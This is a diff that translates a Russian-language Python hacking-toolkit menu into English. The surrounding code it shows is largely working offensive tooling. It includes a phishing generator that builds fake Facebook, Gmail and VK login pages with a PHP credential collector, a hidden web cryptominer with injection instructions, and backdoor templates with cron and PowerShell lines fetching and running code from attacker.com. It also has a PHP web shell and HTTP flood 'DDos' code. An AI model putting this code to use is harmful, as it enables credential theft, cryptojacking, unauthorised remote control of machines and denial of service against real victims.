@@ -136,7 +136,7 @@ def install_module(module):
             if "Requirement already satisfied:" not in line:
                 print(line)
     except Exception as e:
-        print(f"[ERROR] Не удалось установить модуль {module}: {e}")
+        print(f"[ERROR] Failed to install module {module}: {e}")
 
 def check_and_install_modules(modules):
     with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
@@ -221,7 +221,7 @@ def screen():
 ########### ###    ####     ###     ########## ###    ### ###    #### ##########     ###              ###     ########   ########  ##########          ###    ###  #######  ### ####### ###  ########  """)
 
 def cont():
-    input(f"\n{w}[{w}>{w}]{w} Нажмите ENTER для продолжения...")
+    input(f"\n{w}[{w}>{w}]{w} Press ENTER to continue...")
 
 def safe_input(prompt: str, default: str = "") -> str:
     try:
@@ -232,35 +232,32 @@ def safe_input(prompt: str, default: str = "") -> str:
     except (EOFError, KeyboardInterrupt):
         return default
 
-# ==================== НОВЫЕ ФУНКЦИИ ====================
-
-# 14. ФИШИНГ-ГЕНЕРАТОР
 def phishing_kit_generator():
     screen()
-    print(f"{c}[{w}*{c}]{w} Генератор фишинговых страниц\n")
+    print(f"{c}[{w}*{c}]{w} Phishing Page Generator\n")
     
     templates = {
         "1": {"name": "Facebook", "file": "facebook_login.html"},
         "2": {"name": "Gmail", "file": "gmail_login.html"}, 
-        "3": {"name": "ВКонтакте", "file": "vk_login.html"},
+        "3": {"name": "VKontakte", "file": "vk_login.html"},
     }
     
-    print(f"{w}Доступные шаблоны:")
+    print(f"{w}Available templates:")
     for key, template in templates.items():
         print(f"{w}[{key}]{w} {template['name']}")
     
-    choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите шаблон: ")
+    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select template: ")
     
     if choice in templates:
         template = templates[choice]
-        print(f"\n{w}[{w}*{w}]{w} Генерируем фишинговую страницу {template['name']}...")
+        print(f"\n{w}[{w}*{w}]{w} Generating phishing page {template['name']}...")
         
         if template['name'] == "Facebook":
             phishing_html = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Facebook - Вход в систему</title>
+    <title>Facebook - Log In</title>
     <style>
         body { font-family: Arial, sans-serif; background: #f0f2f5; }
         .login { width: 400px; margin: 100px auto; background: white; padding: 20px; border-radius: 8px; }
@@ -270,11 +267,11 @@ def phishing_kit_generator():
 </head>
 <body>
     <div class="login">
-        <h2>Вход в Facebook</h2>
+        <h2>Log in to Facebook</h2>
         <form action="collect.php" method="POST">
-            <input type="text" name="email" placeholder="Электронная почта или телефон" required>
-            <input type="password" name="password" placeholder="Пароль" required>
-            <button type="submit">Вход</button>
+            <input type="text" name="email" placeholder="Email or phone number" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
         </form>
     </div>
 </body>
@@ -285,7 +282,7 @@ def phishing_kit_generator():
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Gmail - Вход</title>
+    <title>Gmail - Sign In</title>
     <style>
         body { font-family: Arial, sans-serif; background: white; }
         .login { width: 400px; margin: 100px auto; padding: 20px; }
@@ -295,22 +292,22 @@ def phishing_kit_generator():
 </head>
 <body>
     <div class="login">
-        <h2>Вход в Gmail</h2>
+        <h2>Sign in to Gmail</h2>
         <form action="collect.php" method="POST">
-            <input type="email" name="email" placeholder="Электронная почта" required>
-            <input type="password" name="password" placeholder="Пароль" required>
-            <button type="submit">Далее</button>
+            <input type="email" name="email" placeholder="Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Next</button>
         </form>
     </div>
 </body>
 </html>
 """
-        elif template['name'] == "ВКонтакте":
+        elif template['name'] == "VKontakte":
             phishing_html = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ВКонтакте - Вход</title>
+    <title>VKontakte - Log In</title>
     <style>
         body { font-family: Arial, sans-serif; background: #4a76a8; color: white; }
         .login { width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; color: #333; }
@@ -321,19 +318,19 @@ def phishing_kit_generator():
 </head>
 <body>
     <div class="login">
-        <div class="logo">ВКонтакте</div>
-        <h2>Вход в VK</h2>
+        <div class="logo">VKontakte</div>
+        <h2>Log in to VK</h2>
         <form action="collect.php" method="POST">
-            <input type="text" name="login" placeholder="Телефон или email" required>
-            <input type="password" name="password" placeholder="Пароль" required>
-            <button type="submit">Войти</button>
+            <input type="text" name="login" placeholder="Phone or email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
         </form>
     </div>
 </body>
 </html>
 """
         else:
-            print(f"{r}[{w}-{r}]{w} Шаблон не найден")
+            print(f"{r}[{w}-{r}]{w} Template not found")
             cont()
             return
         
@@ -341,15 +338,15 @@ def phishing_kit_generator():
             f.write(phishing_html)
         
         collector_php = """<?php
-$data = "=== ФИШИНГ ДАННЫЕ ===\\n";
-$data .= "Время: " . date('Y-m-d H:i:s') . "\\n";
+$data = "=== PHISHING DATA ===\\n";
+$data .= "Time: " . date('Y-m-d H:i:s') . "\\n";
 $data .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\\n";
 
 foreach($_POST as $key => $value) {
     $data .= "$key: $value\\n";
 }
 
-$data .= "=== КОНЕЦ ДАННЫХ ===\\n\\n";
+$data .= "=== END DATA ===\\n\\n";
 
 file_put_contents('stolen_data.txt', $data, FILE_APPEND);
 header('Location: https://vk.com');
@@ -359,54 +356,53 @@ exit;
         with open('collect.php', 'w', encoding='utf-8') as f:
             f.write(collector_php)
         
-        print(f"{g}[{w}+{g}]{w} Созданы файлы:")
-        print(f"   {c}>{w} {template['file']} - фишинговая страница")
-        print(f"   {c}>{w} collect.php - сборщик данных") 
-        print(f"   {c}>{w} stolen_data.txt - файл с собранными данными")
-        print(f"\n{y}[{w}!{y}]{w} Загрузите файлы на хостинг с поддержкой PHP")
+        print(f"{g}[{w}+{g}]{w} Created files:")
+        print(f"   {c}>{w} {template['file']} - phishing page")
+        print(f"   {c}>{w} collect.php - data collector") 
+        print(f"   {c}>{w} stolen_data.txt - collected data file")
+        print(f"\n{y}[{w}!{y}]{w} Upload files to hosting with PHP support")
         
     else:
-        print(f"{r}[{w}-{r}]{w} Неверный выбор")
+        print(f"{r}[{w}-{r}]{w} Invalid choice")
     
     cont()
 
-# 15. ПРОДВИНУТЫЙ ПОДБОР ПАРОЛЕЙ
 def advanced_bruteforce():
     screen()
-    print(f"{c}[{w}*{c}]{w} Продвинутый подбор паролей\n")
+    print(f"{c}[{w}*{c}]{w} Advanced Password Brute Force\n")
     
-    print(f"{w}[1]{w} Атака по словарю")
-    print(f"{w}[2]{w} Атака по маске") 
-    print(f"{w}[3]{w} Проверка утекших паролей")
+    print(f"{w}[1]{w} Dictionary attack")
+    print(f"{w}[2]{w} Mask attack") 
+    print(f"{w}[3]{w} Check leaked passwords")
     
-    choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите тип атаки: ")
+    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select attack type: ")
     
     if choice == "1":
-        target = safe_input(f"{w}[{w}?{w}]{w} Цель (URL или хост): ")
-        username = safe_input(f"{w}[{w}?{w}]{w} Имя пользователя: ")
-        wordlist = safe_input(f"{w}[{w}?{w}]{w} Путь к словарю: ", "passwords.txt")
+        target = safe_input(f"{w}[{w}?{w}]{w} Target (URL or host): ")
+        username = safe_input(f"{w}[{w}?{w}]{w} Username: ")
+        wordlist = safe_input(f"{w}[{w}?{w}]{w} Path to wordlist: ", "passwords.txt")
         
-        print(f"\n{w}[{w}*{w}]{w} Запуск атаки по словарю...")
+        print(f"\n{w}[{w}*{w}]{w} Starting dictionary attack...")
         
         try:
             with open(wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                 passwords = [line.strip() for line in f if line.strip()]
             
-            print(f"{w}[{w}*{w}]{w} Загружено паролей: {len(passwords)}")
+            print(f"{w}[{w}*{w}]{w} Loaded passwords: {len(passwords)}")
             
             for i, password in enumerate(passwords[:50]):
-                print(f"{w}Проверка: {y}{password}{w}...", end="\r")
+                print(f"{w}Checking: {y}{password}{w}...", end="\r")
                 time.sleep(0.01)
                 
-            print(f"\n{g}[{w}+{g}]{w} Атака завершена (демо-режим)")
+            print(f"\n{g}[{w}+{g}]{w} Attack completed (demo mode)")
             
         except FileNotFoundError:
-            print(f"{r}[{w}-{r}]{w} Файл словаря не найден")
-            print(f"{y}[{w}!{y}]{w} Создайте файл passwords.txt с паролями")
+            print(f"{r}[{w}-{r}]{w} Wordlist file not found")
+            print(f"{y}[{w}!{y}]{w} Create passwords.txt file with passwords")
     
     elif choice == "2":
-        mask = safe_input(f"{w}[{w}?{w}]{w} Маска (например: pass??123): ")
-        print(f"\n{w}[{w}*{w}]{w} Генерация паролей по маске...")
+        mask = safe_input(f"{w}[{w}?{w}]{w} Mask (example: pass??123): ")
+        print(f"\n{w}[{w}*{w}]{w} Generating passwords by mask...")
         
         import itertools
         import string
@@ -418,47 +414,46 @@ def advanced_bruteforce():
             test_pass = mask
             for char in combo:
                 test_pass = test_pass.replace('?', char, 1)
-            print(f"{w}Сгенерирован: {y}{test_pass}{w}")
+            print(f"{w}Generated: {y}{test_pass}{w}")
             count += 1
             if count >= 20:
                 break
                 
-        print(f"{g}[{w}+{g}]{w} Сгенерировано паролей: {count}")
+        print(f"{g}[{w}+{g}]{w} Generated passwords: {count}")
     
     elif choice == "3":
-        email = safe_input(f"{w}[{w}?{w}]{w} Email для проверки: ")
-        print(f"\n{w}[{w}*{w}]{w} Проверка утекших паролей для {email}...")
+        email = safe_input(f"{w}[{w}?{w}]{w} Email to check: ")
+        print(f"\n{w}[{w}*{w}]{w} Checking leaked passwords for {email}...")
         
         leaked_dbs = ["Collection1", "AntiPublic", "Exploit.in"]
         
         for db in leaked_dbs:
-            print(f"{w}Проверка в базе {y}{db}{w}...", end="\r")
+            print(f"{w}Checking in database {y}{db}{w}...", end="\r")
             time.sleep(1)
             if random.random() > 0.7:
                 fake_pass = "P@ssw0rd" + str(random.randint(100, 999))
-                print(f"{g}[{w}+{g}]{w} Найден в {db}: {y}{fake_pass}{w}")
+                print(f"{g}[{w}+{g}]{w} Found in {db}: {y}{fake_pass}{w}")
             else:
-                print(f"{r}[{w}-{r}]{w} Не найден в {db}")
+                print(f"{r}[{w}-{r}]{w} Not found in {db}")
     
     cont()
 
-# 16. WIFI АУДИТ
 def wifi_auditor():
     screen()
-    print(f"{c}[{w}*{c}]{w} Аудит WiFi сетей\n")
+    print(f"{c}[{w}*{c}]{w} WiFi Network Audit\n")
     
     try:
         import scapy.all as scapy
         
-        print(f"{w}[1]{w} Сканирование WiFi сетей")
-        print(f"{w}[2]{w} Атака на WPA/WPA2")
-        print(f"{w}[3]{w} Генератор PIN для WPS")
+        print(f"{w}[1]{w} Scan WiFi networks")
+        print(f"{w}[2]{w} WPA/WPA2 attack")
+        print(f"{w}[3]{w} WPS PIN generator")
         
-        choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите опцию: ")
+        choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
         
         if choice == "1":
-            print(f"\n{w}[{w}*{w}]{w} Сканирование WiFi сетей...")
-            print(f"{y}[{w}!{y}]{w} Для работы требуется WiFi адаптер в режиме монитора")
+            print(f"\n{w}[{w}*{w}]{w} Scanning WiFi networks...")
+            print(f"{y}[{w}!{y}]{w} Requires WiFi adapter in monitor mode")
             
             fake_networks = [
                 {"ssid": "Home_Network", "bssid": "AA:BB:CC:DD:EE:FF", "channel": 6, "encryption": "WPA2"},
@@ -466,39 +461,38 @@ def wifi_auditor():
                 {"ssid": "Free_WiFi", "bssid": "99:88:77:66:55:44", "channel": 1, "encryption": "OPEN"},
             ]
             
-            print(f"\n{g}[{w}+{g}]{w} Найдено сетей: {len(fake_networks)}\n")
+            print(f"\n{g}[{w}+{g}]{w} Found networks: {len(fake_networks)}\n")
             for net in fake_networks:
                 enc_color = g if net["encryption"] == "OPEN" else y
                 print(f"SSID: {y}{net['ssid']:<15}{w} BSSID: {c}{net['bssid']}{w} Channel: {net['channel']} Encryption: {enc_color}{net['encryption']}{w}")
         
         elif choice == "2":
-            target_bssid = safe_input(f"{w}[{w}?{w}]{w} BSSID цели: ")
-            print(f"\n{w}[{w}*{w}]{w} Запуск атаки на WPA2 для {target_bssid}...")
-            print(f"{y}[{w}!{y}]{w} Требуется handshake capture и словарь паролей")
+            target_bssid = safe_input(f"{w}[{w}?{w}]{w} Target BSSID: ")
+            print(f"\n{w}[{w}*{w}]{w} Starting WPA2 attack for {target_bssid}...")
+            print(f"{y}[{w}!{y}]{w} Requires handshake capture and password dictionary")
             
         elif choice == "3":
-            print(f"\n{w}[{w}*{w}]{w} Генерация PIN кодов WPS...")
+            print(f"\n{w}[{w}*{w}]{w} Generating WPS PIN codes...")
             for i in range(10):
                 pin = f"{random.randint(10000000, 99999999):08d}"
                 print(f"{w}PIN {i+1}: {y}{pin}{w}")
                 
     except ImportError:
-        print(f"{r}[{w}-{r}]{w} Scapy не установлен")
+        print(f"{r}[{w}-{r}]{w} Scapy not installed")
     
     cont()
 
-# 17. КРИПТО-МАЙНИНГ
 def crypto_jacker():
     screen()
-    print(f"{c}[{w}*{c}]{w} Крипто-майнинг инструменты\n")
+    print(f"{c}[{w}*{c}]{w} Crypto Mining Tools\n")
     
-    print(f"{w}[1]{w} Генератор майнинг-скриптов")
-    print(f"{w}[2]{w} Анализ доходности")
+    print(f"{w}[1]{w} Mining script generator")
+    print(f"{w}[2]{w} Profitability analysis")
     
-    choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите опцию: ")
+    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select option: ")
     
     if choice == "1":
-        wallet = safe_input(f"{w}[{w}?{w}]{w} Кошелек для выплат: ", "45abc123def456...")
+        wallet = safe_input(f"{w}[{w}?{w}]{w} Payout wallet: ", "45abc123def456...")
         
         mining_js = """
 // XMRig Web Miner
@@ -517,7 +511,7 @@ document.addEventListener('visibilitychange', function() {
 });
 """ % wallet
         
-        filename = safe_input(f"{w}[{w}?{w}]{w} Имя файла: ", "miner.js")
+        filename = safe_input(f"{w}[{w}?{w}]{w} File name: ", "miner.js")
         with open(filename, 'w') as f:
             f.write(mining_js)
         
@@ -526,13 +520,13 @@ document.addEventListener('visibilitychange', function() {
 <script src="%s"></script>
 """ % filename
         
-        print(f"\n{g}[{w}+{g}]{w} Майнинг-скрипт создан:")
-        print(f"   {c}>{w} {filename} - основной скрипт")
-        print(f"\n{y}[{w}!{y}]{w} Для внедрения добавьте в HTML:")
+        print(f"\n{g}[{w}+{g}]{w} Mining script created:")
+        print(f"   {c}>{w} {filename} - main script")
+        print(f"\n{y}[{w}!{y}]{w} For injection add to HTML:")
         print(f"{y}{html_injection}{w}")
     
     elif choice == "2":
-        print(f"\n{w}[{w}*{w}]{w} Анализ доходности майнинга...")
+        print(f"\n{w}[{w}*{w}]{w} Mining profitability analysis...")
         
         algorithms = [
             {"name": "RandomX (Monero)", "profit": "0.0012 XMR/day", "power": "Medium"},
@@ -540,29 +534,28 @@ document.addEventListener('visibilitychange', function() {
         ]
         
         for algo in algorithms:
-            print(f"{w}Алгоритм: {y}{algo['name']:<20}{w} Доход: {g}{algo['profit']:<15}{w} Мощность: {algo['power']}")
+            print(f"{w}Algorithm: {y}{algo['name']:<20}{w} Profit: {g}{algo['profit']:<15}{w} Power: {algo['power']}")
     
     cont()
 
-# 18. ПЕРСИСТЕНТНЫЕ БЭКДОРЫ
 def persistent_backdoor():
     screen()
-    print(f"{c}[{w}*{c}]{w} Персистентные бэкдоры\n")
+    print(f"{c}[{w}*{c}]{w} Persistent Backdoors\n")
     
-    print(f"{w}[1]{w} Linux бэкдор (cron/systemd)")
-    print(f"{w}[2]{w} Windows бэкдор (реестр/автозагрузка)") 
-    print(f"{w}[3]{w} Web бэкдор (PHP)")
+    print(f"{w}[1]{w} Linux backdoor (cron/systemd)")
+    print(f"{w}[2]{w} Windows backdoor (registry/autostart)") 
+    print(f"{w}[3]{w} Web backdoor (PHP)")
     
-    choice = safe_input(f"\n{w}[{w}?{w}]{w} Выберите тип бэкдора: ")
+    choice = safe_input(f"\n{w}[{w}?{w}]{w} Select backdoor type: ")
     
     if choice == "1":
-        print(f"\n{w}[{w}*{w}]{w} Генерация Linux бэкдора...")
+        print(f"\n{w}[{w}*{w}]{w} Generating Linux backdoor...")
         
-        cron_backdoor = """# Добавить в crontab (crontab -e)
+        cron_backdoor = """# Add to crontab (crontab -e)
 */5 * * * * curl -s http://attacker.com/shell.sh | bash
 */10 * * * * wget -q -O- http://attacker.com/payload.py | python3
 
-# Systemd сервис
+# Systemd service
 [Unit]
 Description=System Update Service
 After=network.target
@@ -579,19 +572,19 @@ WantedBy=multi-user.target
         with open('linux_backdoor.txt', 'w') as f:
             f.write(cron_backdoor)
         
-        print(f"{g}[{w}+{g}]{w} Создан файл: linux_backdoor.txt")
-        print(f"{y}[{w}!{y}]{w} Инструкции для Linux персистентности")
+        print(f"{g}[{w}+{g}]{w} Created file: linux_backdoor.txt")
+        print(f"{y}[{w}!{y}]{w} Instructions for Linux persistence")
     
     elif choice == "2":
-        print(f"\n{w}[{w}*{w}]{w} Генерация Windows бэкдора...")
+        print(f"\n{w}[{w}*{w}]{w} Generating Windows backdoor...")
         
-        windows_backdoor = """# Реестр автозагрузки
+        windows_backdoor = """# Registry autostart
 REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /V "WindowsUpdate" /T REG_SZ /D "C:\\payload.exe"
 
-# Планировщик заданий
+# Task scheduler
 schtasks /create /tn "SystemUpdate" /tr "C:\\payload.exe" /sc hourly /mo 1
 
-# PowerShell бэкдор
+# PowerShell backdoor
 while($true) {
     try {
         $cmd = (Invoke-WebRequest "http://attacker.com/cmd.txt").Content
@@ -606,11 +599,11 @@ while($true) {
         with open('windows_backdoor.txt', 'w') as f:
             f.write(windows_backdoor)
         
-        print(f"{g}[{w}+{g}]{w} Создан файл: windows_backdoor.txt")
-        print(f"{y}[{w}!{y}]{w} Инструкции для Windows персистентности")
+        print(f"{g}[{w}+{g}]{w} Created file: windows_backdoor.txt")
+        print(f"{y}[{w}!{y}]{w} Instructions for Windows persistence")
     
     elif choice == "3":
-        print(f"\n{w}[{w}*{w}]{w} Генерация веб-бэкдора...")
+        print(f"\n{w}[{w}*{w}]{w} Generating web backdoor...")
         
         web_backdoor = """<?php
 if(isset($_REQUEST['key']) && $_REQUEST['key'] == 'secret123') {
@@ -627,12 +620,10 @@ if(isset($_REQUEST['key']) && $_REQUEST['key'] == 'secret123') {
         with open('web_backdoor.php', 'w') as f:
             f.write(web_backdoor)
         
-        print(f"{g}[{w}+{g}]{w} Создан файл: web_backdoor.php")
-        print(f"{y}[{w}!{y}]{w} Использование: example.com/page.php?key=secret123&cmd=whoami")
+        print(f"{g}[{w}+{g}]{w} Created file: web_backdoor.php")
+        print(f"{y}[{w}!{y}]{w} Usage: example.com/page.php?key=secret123&cmd=whoami")
     
     cont()
-
-# ==================== ОСНОВНОЕ МЕНЮ ====================
 
 def main_screen():
     global r, b, w, g  
@@ -649,16 +640,16 @@ def main_screen():
     #+#     #+#   #+#+#     #+#     #+#        #+#    #+# #+#   #+#+# #+#            #+#              #+#    #+#    #+# #+#    #+# #+#               #+#+#+#  #+# #+#   #+# #+#   #+#   #+# #+#    #+# 
 ########### ###    ####     ###     ########## ###    ### ###    #### ##########     ###              ###     ########   ########  ##########          ###    ###  #######  ### ####### ###  ########                                   
 ╠════════════════════════════════════════════════════════════════════════════════════╣
-║   {w}[{w}1{w}]{w} Проверка ip и ms       {w}[{w}8{w}]{w}  Скан портов              {w}[{w}15{w}]{w} WiFi аудит         ║
-║   {w}[{w}2{w}]{w} Проверка соединения    {w}[{w}9{w}]{w}  Дорк                     {w}[{w}16{w}]{w} Крипто-майнинг     ║
-║   {w}[{w}3{w}]{w} XSS Scanner            {w}[{w}10{w}]{w} Поиск админ панели       {w}[{w}17{w}]{w} Персистент бэкдоры ║
-║   {w}[{w}4{w}]{w} Stress-Test            {w}[{w}11{w}]{w} Перебор пароля           {w}[{w}18{w}]{w}                    ║
-║   {w}[{w}5{w}]{w} DDos                   {w}[{w}12{w}]{w} SQL инъекция             {w}[{w}19{w}]{w}                    ║
-║   {w}[{w}6{w}]{w} Проверка proxy         {w}[{w}13{w}]{w} Поиск по базе            {w}[{w}20{w}]{w}                    ║
-║   {w}[{w}7{w}]{w} Поиск по юзеру         {w}[{w}14{w}]{w} Фишинг-генератор         {w}[{w}88{w}]{w} Выход              ║
+║   {w}[{w}1{w}]{w} Check IP and ping       {w}[{w}8{w}]{w}  Port scan               {w}[{w}15{w}]{w} WiFi audit         ║
+║   {w}[{w}2{w}]{w} Check connection        {w}[{w}9{w}]{w}  Dork search             {w}[{w}16{w}]{w} Crypto mining      ║
+║   {w}[{w}3{w}]{w} XSS Scanner            {w}[{w}10{w}]{w} Admin panel search       {w}[{w}17{w}]{w} Persistent backdoor ║
+║   {w}[{w}4{w}]{w} Stress-Test            {w}[{w}11{w}]{w} Password brute           {w}[{w}18{w}]{w}                    ║
+║   {w}[{w}5{w}]{w} DDos                   {w}[{w}12{w}]{w} SQL injection            {w}[{w}19{w}]{w}                    ║
+║   {w}[{w}6{w}]{w} Check proxy            {w}[{w}13{w}]{w} Database search          {w}[{w}20{w}]{w}                    ║
+║   {w}[{w}7{w}]{w} User search            {w}[{w}14{w}]{w} Phishing generator       {w}[{w}88{w}]{w} Exit               ║
 ╚════════════════════════════════════════════════════════════════════════════════════╝
 """) 
-        select = input(f"{w}[{w}?{w}]{w} Введите опцию: ")
+        select = input(f"{w}[{w}?{w}]{w} Select option: ")
         try:
             if select == '1':
                 screen()
@@ -764,7 +755,7 @@ def main_screen():
 
                 def check_internet_interface():
                     url_to_check = safe_input(
-                        f"{w}[{w}?{w}]{w} Введите URL для проверки (Enter — https://www.google.com): ",
+                        f"{w}[{w}?{w}]{w} Enter URL to check (Enter — https://www.google.com): ",
                         default=""
                     ).strip()
                     if not url_to_check:
@@ -776,13 +767,13 @@ def main_screen():
                     speed_str = f"{speed} ms" if isinstance(speed, int) else "N/A"
 
                     if res["ok"]:
-                        print(f"{g}[{w}+{g}]{w} Соединение с {url_to_check} установлено.")
+                        print(f"{g}[{w}+{g}]{w} Connection to {url_to_check} established.")
                     elif status == 403:
-                        print(f"{r}[{w}!{r}]{w} Есть соединение, но нет доступа (403 Forbidden).")
+                        print(f"{r}[{w}!{r}]{w} Connection exists but no access (403 Forbidden).")
                     elif isinstance(status, int):
-                        print(f"{r}[{w}ERROR{r}]{w} Сервер ответил ошибкой: HTTP {status}.")
+                        print(f"{r}[{w}ERROR{r}]{w} Server responded with error: HTTP {status}.")
                     else:
-                        print(f"{r}[{w}-{r}]{w} Невозможно подключиться к {url_to_check} ({status})")
+                        print(f"{r}[{w}-{r}]{w} Cannot connect to {url_to_check} ({status})")
 
                     print()
                     print(f"[STATUS] {status}")
@@ -811,13 +802,13 @@ def main_screen():
                         try:
                             response = requests.get(target_url, verify=False, timeout=5)
                             if payload in response.text:
-                                print(f"{g}[{w}+{g}]{w} XSS найдено: {target_url}")
+                                print(f"{g}[{w}+{g}]{w} XSS found: {target_url}")
                             else:
-                                print(f"{r}[{w}-{r}]{w} XSS не найдено: {target_url}")
+                                print(f"{r}[{w}-{r}]{w} XSS not found: {target_url}")
                         except Exception as e:
-                            print(f"{r}[{w}-{r}]{w} Ошибка: {e}")
+                            print(f"{r}[{w}-{r}]{w} Error: {e}")
 
-                url_to_scan = input(f"{w}[{w}?{w}]{w} Введите URL: ")
+                url_to_scan = input(f"{w}[{w}?{w}]{w} Enter URL: ")
                 scan_xss(url_to_scan)
                 cont()
 
@@ -843,11 +834,11 @@ def main_screen():
                         response = requests.get(url, headers=headers, timeout=5, verify=False)
                         with lock:
                             successful_requests += 1
-                        print(f"Ответ сервера: {response.status_code}")
+                        print(f"Server response: {response.status_code}")
                     except:
                         with lock:
                             failed_requests += 1
-                        print("Не удалось отправить запрос")
+                        print("Failed to send request")
 
                 def attack(url, num_requests):
                     threads = []
@@ -859,13 +850,13 @@ def main_screen():
                     for thread in threads:
                         thread.join()
 
-                    print(f"{g}[{w}+{g}]{w} Успешно отправлено запросов: {successful_requests}")
-                    print(f"{r}[{w}-{r}]{w} Не удалось отправить запросов: {failed_requests}")
+                    print(f"{g}[{w}+{g}]{w} Successfully sent requests: {successful_requests}")
+                    print(f"{r}[{w}-{r}]{w} Failed to send requests: {failed_requests}")
 
-                target_url = input(f"[?] Введите URL: ")
+                target_url = input(f"[?] Enter URL: ")
                 if not target_url.startswith(('http://', 'https://')):
                     target_url = 'https://' + target_url
-                num_requests = int(input(f"[?] Сколько запросов нужно отправить: "))
+                num_requests = int(input(f"[?] How many requests to send: "))
                 attack(target_url, num_requests)
                 cont()
 
@@ -875,7 +866,7 @@ def main_screen():
                 import random
                 
                 url = input("[?] URL -> ")
-                num_requests = int(input("[?] Введите количество запросов -> "))
+                num_requests = int(input("[?] Enter number of requests -> "))
                 user_agents = [
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", 
@@ -918,21 +909,20 @@ def main_screen():
                 }
 
                 def load_proxies(file_path):
-                    # Создаем папку proxy если ее нет
                     proxy_dir = "proxy"
                     if not os.path.exists(proxy_dir):
                         os.makedirs(proxy_dir)
-                        print(f"{y}[{w}!{y}]{w} Создана папка '{proxy_dir}'")
+                        print(f"{y}[{w}!{y}]{w} Created folder '{proxy_dir}'")
                     
                     try:
                         with open(file_path, "r", encoding="utf-8") as f:
                             proxies = [line.strip() for line in f if line.strip()]
                             if proxies:
                                 file_name = os.path.basename(file_path)
-                                print(f"{g}[{w}+{g}]{w} Загружено {len(proxies)} прокси из {file_name}")
+                                print(f"{g}[{w}+{g}]{w} Loaded {len(proxies)} proxies from {file_name}")
                             return proxies
                     except FileNotFoundError:
-                        print(f"{r}[ERROR]{w} Файл не найден: {file_path} — будет пропущен.")
+                        print(f"{r}[ERROR]{w} File not found: {file_path} — will be skipped.")
                         return []
 
                 def build_requests_proxies(proxy, proto):
@@ -962,9 +952,9 @@ def main_screen():
                 all_proxies = {}
                 for proto, filename in proxy_files.items():
                     all_proxies[proto] = load_proxies(filename)
-                    print(f"[i] Загружено {len(all_proxies[proto])} прокси для {proto}")
+                    print(f"[i] Loaded {len(all_proxies[proto])} proxies for {proto}")
 
-                print("\n[i] Проверяем прокси многопоточно...")
+                print("\n[i] Checking proxies multithreaded...")
                 with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
                     future_to_proxy = {}
                     for proto, proxies in all_proxies.items():
@@ -982,11 +972,11 @@ def main_screen():
                         print(f"[{done_count}/{total}] [{proto}] {proxy} -> {status} {lat_display}")
                         proxies_store[proto].append({"proxy": proxy, "ok": ok, "latency_ms": latency_ms})
 
-                print("\n[i] Сводка (топ 10 рабочих прокси по протоколам):")
+                print("\n[i] Summary (top 10 working proxies by protocol):")
                 for proto, results in proxies_store.items():
                     working = [r for r in results if r["ok"]]
                     working_sorted = sorted(working, key=lambda x: x["latency_ms"] if x["latency_ms"] is not None else 9999)
-                    print(f"\n{proto}: всего {len(results)}, рабочие {len(working)}")
+                    print(f"\n{proto}: total {len(results)}, working {len(working)}")
                     for r in working_sorted[:10]:
                         print(f"    {r['proxy']} — {r['latency_ms']}ms")
                 cont()
@@ -994,7 +984,7 @@ def main_screen():
             elif select == '7':
                 screen()
                 services = {
-                    "ВКонтакте": "https://vk.com/{}",
+                    "VKontakte": "https://vk.com/{}",
                     "Telegram": "https://t.me/{}",
                     "GitHub": "https://github.com/{}",
                     "Instagram": "https://www.instagram.com/{}",
@@ -1005,28 +995,28 @@ def main_screen():
                     try:
                         response = requests.get(url, timeout=5, verify=False)
                         if response.status_code == 200:
-                            return f"{g}[{w}+{g}]{w} {url}"
+                            return f"{g}[+]{w} {url}"
                         else:
-                            return f"{r}[{w}-{r}]{w} {url}"
+                            return f"{r}[-]{w} {url}"
                     except requests.RequestException:
-                        return f"{r}[{w}-{r}]{w} {url}"
+                        return f"{r}[-]{w} {url}"
 
                 def check_nickname(nickname):
                     with concurrent.futures.ThreadPoolExecutor() as executor:
                         results = {service: executor.submit(check_service, url.format(nickname)) for service, url in services.items()}
                         return {service: result.result() for service, result in results.items()}
 
-                nickname = input(f"{w}[{w}?{w}]{w} Введите username: ")
+                nickname = input(f"{w}[{w}?{w}]{w} Enter username: ")
                 results = check_nickname(nickname)
 
-                print("\n=== Результаты ===\n")
+                print("\n=== Results ===\n")
                 for service, result in results.items():
                     print(f"{service}: {result}")
                 cont()
 
             elif select == '8':
                 screen()
-                print(f"{c}[{w}*{c}]{w} Сканер портов\n")
+                print(f"{c}[{w}*{c}]{w} Port Scanner\n")
                 
                 protocols = {
                     21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
@@ -1049,8 +1039,8 @@ def main_screen():
 
                 def scan_ports(target_ip, start_port, end_port, max_threads=100):
                     open_ports = []
-                    print(f"{w}[{w}*{w}]{w} Сканируем {target_ip} с порта {start_port} по {end_port}...")
-                    print(f"{w}[{w}*{w}]{w} Используется {max_threads} потоков\n")
+                    print(f"{w}[{w}*{w}]{w} Scanning {target_ip} from port {start_port} to {end_port}...")
+                    print(f"{w}[{w}*{w}]{w} Using {max_threads} threads\n")
                     
                     with ThreadPoolExecutor(max_workers=max_threads) as executor:
                         futures = []
@@ -1065,50 +1055,48 @@ def main_screen():
                             port, protocol, is_open = future.result()
                             completed += 1
                             
-                            # Показываем прогресс каждые 100 портов
                             if completed % 100 == 0:
-                                print(f"{w}[{w}*{w}]{w} Прогресс: {completed}/{total} портов...")
